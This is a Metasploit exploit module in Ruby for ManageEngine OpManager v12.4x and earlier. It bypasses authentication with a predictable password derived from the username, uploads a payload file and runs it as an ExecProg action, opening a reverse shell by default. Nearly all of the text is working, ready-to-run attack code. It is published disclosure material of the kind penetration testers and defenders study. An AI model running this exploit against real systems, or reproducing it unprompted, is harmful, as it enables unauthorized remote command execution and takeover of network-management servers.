# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "ManageEngine OpManager v12.4x - Unauthenticated Remote Command Execution",
      &#039;Description&#039;    => %q(
        This module bypasses the user password requirement in the OpManager v12.4.034 and prior versions.
        It performs authentication bypass and executes commands on the server.

        /////// This 0day has been published at DEFCON-AppSec Village. ///////

      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Discovery & PoC & Metasploit module @ehakkus
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://pentest.com.tr/exploits/DEFCON-ManageEngine-OpManager-v12-4-Unauthenticated-Remote-Command-Execution.html&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039; => 60,
          &#039;RPORT&#039; => 8060,
          &#039;SSL&#039; => false,
          &#039;PAYLOAD&#039; => &#039;generic/shell_reverse_tcp&#039;
        },
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
        },
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;win&#039;],
      &#039;Targets&#039; =>
        [
          [ &#039;Windows Target&#039;,
            {
              &#039;Platform&#039; => [&#039;win&#039;],
              &#039;Arch&#039; => ARCH_CMD,
            }
          ],
          [ &#039;Linux Target&#039;,
            {
              &#039;Platform&#039; => [&#039;unix&#039;],
              &#039;Arch&#039; => ARCH_CMD,
              &#039;Payload&#039; =>
                {
                  &#039;Compat&#039; =>
                    {
                      &#039;PayloadType&#039; => &#039;cmd&#039;,
                    }
                }
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;10 August 2019 //DEFCON&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;OpManager Username&#039;, &#039;admin&#039;]),
        OptString.new(&#039;TARGETURI&#039;,  [true, &#039;Base path for ME application&#039;, &#039;/&#039;])
      ],self.class)
  end

  def check_platform(host, port, cookie)

    res = send_request_cgi(
      &#039;rhost&#039;   => host,
      &#039;rport&#039;   => port,
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;showTile.do&#039;),
      &#039;cookie&#039;  => cookie,
      &#039;vars_get&#039; => {
        &#039;TileName&#039; => &#039;.ExecProg&#039;,
        &#039;haid&#039; => &#039;null&#039;,
      }
    )
    if res && res.code == 200 && res.body.include?(&#039;createExecProgAction&#039;)
      @dir = res.body.split(&#039;name="execProgExecDir" maxlength="200" size="40" value="&#039;)[1].split(&#039;" class=&#039;)[0]
      if @dir =~ /:/
        platform = Msf::Module::Platform::Windows
      else 
        platform = Msf::Module::Platform::Unix
      end
    else
      fail_with(Failure::Unreachable, &#039;Connection error occurred! DIR could not be detected.&#039;)
    end
    file_up(host, port, cookie, platform, @dir)
  end

  def file_up(host, port, cookie, platform, dir)
    if platform == Msf::Module::Platform::Windows
      filex = ".bat"
    else
      if payload.encoded =~ /sh/
        filex = ".sh"
      elsif payload.encoded =~ /perl/
        filex = ".pl"
      elsif payload.encoded =~ /awk &#039;BEGIN{/
        filex = ".sh"
      elsif payload.encoded =~ /python/
        filex = ".py"
      elsif payload.encoded =~ /ruby/
        filex = ".rb"
      else
        fail_with(Failure::Unknown, &#039;Payload type could not be checked!&#039;)
      end
    end
 
    @fname= rand_text_alpha(9 + rand(3)) + filex
    data = Rex::MIME::Message.new
    data.add_part(&#039;./&#039;, nil, nil, &#039;form-data; name="uploadDir"&#039;)
    data.add_part(payload.encoded, &#039;application/octet-stream&#039;, nil, "form-data; name=\"theFile\"; filename=\"#{@fname}\"")
 
    res = send_request_cgi({
      &#039;rhost&#039;   => host,
      &#039;rport&#039;   => port,
      &#039;method&#039; => &#039;POST&#039;,    
      &#039;data&#039;  => data.to_s,
      &#039;agent&#039; => &#039;Mozilla&#039;,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{data.bound}",
      &#039;cookie&#039; => cookie,
      &#039;uri&#039; => normalize_uri(target_uri, "Upload.do")     
    })
 
    if res && res.code == 200 && res.body.include?(&#039;icon_message_success&#039;)
      print_good("#{@fname} malicious file has been uploaded.")
      create_exec_prog(host, port, cookie, dir, @fname)
    else
      fail_with(Failure::Unknown, &#039;The file could not be uploaded!&#039;)
    end
  end

  def create_exec_prog(host, port, cookie, dir, fname)
 
    @display = rand_text_alphanumeric(7)
    res = send_request_cgi(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;rhost&#039;   => host,
      &#039;rport&#039;   => port,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;adminAction.do&#039;),
      &#039;cookie&#039;  => cookie,
      &#039;vars_post&#039; => {
        &#039;actions&#039; => &#039;/showTile.do?TileName=.ExecProg&haid=null&#039;,
        &#039;method&#039; => &#039;createExecProgAction&#039;,
        &#039;id&#039; => 0,
        &#039;displayname&#039; => @display,
        &#039;serversite&#039; => &#039;local&#039;,
        &#039;choosehost&#039; => -2,
        &#039;abortafter&#039; => 5,
        &#039;command&#039; => fname,
        &#039;execProgExecDir&#039; => dir,
        &#039;cancel&#039; => &#039;false&#039;
      }
    )
 
    if res && res.code == 200 && res.body.include?(&#039;icon_message_success&#039;)
      actionid = res.body.split(&#039;actionid=&#039;)[1].split("&#039;,&#039;710&#039;,&#039;350&#039;,&#039;250&#039;,&#039;200&#039;)")[0] 
      print_status("Transactions completed. Attempting to get a session...")
      exec(host, port, cookie, actionid)
    else
      fail_with(Failure::Unreachable, &#039;Connection error occurred!&#039;)
    end
  end

  def exec(host, port, cookie, action)
    send_request_cgi(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;rhost&#039;   => host,
      &#039;rport&#039;   => port,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;common&#039;, &#039;executeScript.do&#039;),
      &#039;cookie&#039;  => cookie,
      &#039;vars_get&#039; => {
        &#039;method&#039; => &#039;testAction&#039;,
        &#039;actionID&#039; => action,
        &#039;haid&#039; => &#039;null&#039;
      }
    )
  end
 
  def peer
    "#{ssl ? &#039;https://&#039; : &#039;http://&#039; }#{rhost}:#{rport}"
  end
 
  def print_status(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
  def print_error(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
  def print_good(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end 

  def check

    res = send_request_cgi(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;apiclient&#039;, &#039;ember&#039;, &#039;Login.jsp&#039;),
    )

    if res && res.code == 200 && res.body.include?(&#039;Logout.do?showPreLogin=false&#039;)
      appm_adr = res.body.split(&#039;<iframe src="&#039;)[1].split(&#039;/Logout.do?showPreLogin=false&#039;)[0]
      am_host = appm_adr.split(&#039;://&#039;)[1].split(&#039;:&#039;)[0]
      am_port = appm_adr.split(&#039;://&#039;)[1].split(&#039;:&#039;)[1]

      res = send_request_cgi(
        &#039;rhost&#039;   => am_host,
        &#039;rport&#039;   => am_port,
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;applications.do&#039;),
      )
      # Password check vulnerability in Java Script :/
      if res.body.include?(&#039;j_password.value=username&#039;)
        return Exploit::CheckCode::Vulnerable
      else 
        return Exploit::CheckCode::Safe
      end
    else 
      return Exploit::CheckCode::Safe
    end
  end

  def app_login

    res = send_request_cgi(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;apiclient&#039;, &#039;ember&#039;, &#039;Login.jsp&#039;),
    )
    
    appm_adr = res.body.split(&#039;<iframe src="&#039;)[1].split(&#039;/Logout.do?showPreLogin=false&#039;)[0]
    am_host = appm_adr.split(&#039;://&#039;)[1].split(&#039;:&#039;)[0]
    am_port = appm_adr.split(&#039;://&#039;)[1].split(&#039;:&#039;)[1]

    res = send_request_cgi(
      &#039;rhost&#039;   => am_host,
      &#039;rport&#039;   => am_port,
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;applications.do&#039;),
    )

    @cookie = res.get_cookies
    res = send_request_cgi(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;rhost&#039;   => am_host,
      &#039;rport&#039;   => am_port,
      &#039;cookie&#039;   => @cookie,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;/j_security_check&#039;),
      &#039;vars_post&#039; => {
        &#039;clienttype&#039; => &#039;html&#039;,
        &#039;j_username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;j_password&#039; => datastore[&#039;USERNAME&#039;] + "@opm",
        &#039;submit&#039; => &#039;Login&#039;
      }
    )

    if res && res.code == 302 or 303
      print_good("Authentication bypass was successfully performed.")
      res = send_request_cgi(
        &#039;rhost&#039;   => am_host,
        &#039;rport&#039;   => am_port,
        &#039;cookie&#039;  => @cookie,
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;applications.do&#039;),
      )

      @cookie = res.get_cookies
      check_platform(am_host, am_port, @cookie)
    else
      fail_with(Failure::NotVulnerable, &#039;Failed to perform authentication bypass! Try with another username...&#039;)
    end
  end

  def exploit
    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable.&#039;)
    end
    app_login
  end
end

